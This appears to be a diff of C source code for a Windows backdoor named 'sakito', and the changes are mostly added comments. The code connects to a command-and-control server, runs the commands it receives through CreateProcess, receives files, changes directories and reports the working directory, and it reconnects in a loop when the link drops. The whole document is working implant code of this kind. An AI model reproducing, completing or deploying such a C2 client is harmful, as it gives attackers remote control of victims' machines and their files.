@@ -22,7 +22,7 @@ const SOCKET create_socket() {
 	if (WSAStartup(ver, &wsData) != 0)
 		return INVALID_SOCKET;
 
-	// Create connection socket.
+	// Create socket and hint structure
 	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
 	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
@@ -34,6 +34,7 @@ const SOCKET create_socket() {
 
 // Function to connect the connect socket to c2 server.
 int c2_connect(const SOCKET connect_socket) {
+	// Create hint structure.
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
 	hint.sin_port = htons(PORT);
@@ -50,8 +51,10 @@ int c2_connect(const SOCKET connect_socket) {
 
 // Function to execute command.
 BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
+	// Execute command via CreateProcess.
 	BOOL i_result = sakito_win_cp(connect_socket, buf);
 
+	// Send EOS byte to server indicating end of stream.
 	if (send(connect_socket, EOS, 1, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -64,6 +67,7 @@ int ch_dir(char* const dir, SOCKET connect_socket) {
 	if (errno == ENOENT)
 		chdir_result[0] = '0';
 
+	// Send change directory result to server.
 	if (send(connect_socket, chdir_result, 1, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -111,8 +115,10 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 	// Deserialize f_size.
 	int32_t f_size = ntohl_conv(&*(buf));
 
+	// Initialize i_result to true/1.
 	int i_result = SUCCESS;
 
+	// If file exists.
 	if (f_size > 0)
 		// Windows TCP file transfer (recv) function located in sakito_tools.h.
 		i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);
@@ -124,8 +130,10 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 }
 
 int send_cwd(char* const buf, SOCKET connect_socket) {
+	// Store working directory in buf.
 	GetCurrentDirectory(BUFLEN, buf);
 
+	// Send buf bytes containing current working directory to server.
 	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
 		return SOCKET_ERROR;
 
@@ -140,7 +148,7 @@ int main(void) {
 
 		/* 
 		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-	    	occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
+	    occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		statement will parse & execute functions based on the order of probability.
 		*/
 		if (connect_socket != INVALID_SOCKET) {
@@ -153,11 +161,14 @@ int main(void) {
 				i_result = recv(connect_socket, buf, 1, 0);
 				
 				while (i_result > 0) {
+					// Send current working directory to server.
 					if (send_cwd(buf, connect_socket) < 1)
 						break;
 
+					// Set all bytes in buffer to zero.
 					memset(buf, '\0', BUFLEN);
 
+					// Receive command + parsed data.
 					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
 						break;
 
